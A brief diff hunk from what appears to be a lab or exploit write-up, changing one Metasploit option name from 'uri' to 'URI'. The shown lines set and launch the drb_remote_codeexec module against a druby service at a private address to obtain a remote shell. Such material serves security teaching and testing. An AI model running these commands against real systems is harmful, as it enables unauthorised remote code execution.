@@ -49,7 +49,7 @@ Or you can use metasploit module to get an elegant shell!
 
 ```bash
 msf > use exploit/linux/misc/drb_remote_codeexec 
-msf exploit(drb_remote_codeexec) > set uri druby://192.168.0.13:8080
+msf exploit(drb_remote_codeexec) > set URI druby://192.168.0.13:8080
 uri => druby://192.168.0.13:8080
 msf exploit(drb_remote_codeexec) > exploit 
 
